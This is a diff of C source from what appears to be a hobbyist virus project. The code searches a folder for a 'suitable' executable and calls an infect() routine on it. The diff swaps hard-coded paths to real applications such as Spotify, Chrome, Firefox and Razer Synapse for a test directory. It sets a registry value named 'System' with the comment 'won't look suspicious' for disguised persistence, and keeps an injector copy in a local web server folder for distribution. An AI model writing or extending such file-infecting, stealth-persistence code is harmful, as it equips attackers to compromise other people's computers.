@@ -28,15 +28,10 @@
 #define CURRENT_EXE_PATH "C:\\Users\\User\\source\\repos\\virus\\Debug\\injector.exe"
 #define EXE_LOCATION_HTTP_SERVER "C:\\Users\\User\\source\\repos\\virus\\http_server\\wwwroot\\injector.exe"
 
-#define SPOTIFY_PATH "C:\\Users\\User\\AppData\\Roaming\\Spotify\\Spotify.exe"
-#define NOTEPAD_PATH "C:\\Windows\\SysWOW64\\notepad.exe"
-#define RAZER_PATH "C:\\Program Files (x86)\\Razer\\Synapse3\\WPFUI\\Framework\\Razer Synapse 3 Host\\Razer Synapse 3.exe"
 // path to my own program that pops up message box.
 #define MSGBOX_PATH "C:\\Users\\User\\source\\repos\\virus\\programs_to_infect\\msgBox.exe"
-#define MSGBOX_CPY_PATH "C:\\Users\\User\\source\\repos\\virus\\programs_to_infect\\copies\\msgBox.exe"
-#define CHROME_PATH "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe"
 #define NOTEPAD_PLUS_PLUS_PATH "C:\\Program Files (x86)\\Notepad++\\notepad++.exe"
-#define FIREFOX_PATH "C:\\Program Files\\Mozilla Firefox\\firefox.exe"
+#define SEARCH_FROM_THERE_DIRECTORY "C:\\Users\\User\\source\\repos\\virus\\programs_to_infect"	
 
 // Values for the registry
 #define VALUE_NAME "System" // won't look suspicious
@@ -52,7 +47,7 @@ int main()
     int infected_files = 0;
     char infected_path[MAX_PATH];
 
-    if (!get_suitable_file("C:\\Users\\User\\source\\repos\\virus\\programs_to_infect", 0, infected_path))
+    if (!get_suitable_file(SEARCH_FROM_THERE_DIRECTORY, 0, infected_path))
         return ERROR;
     printf("%s is suitable \nstart infecting\n", infected_path);
     result = infect(infected_path);
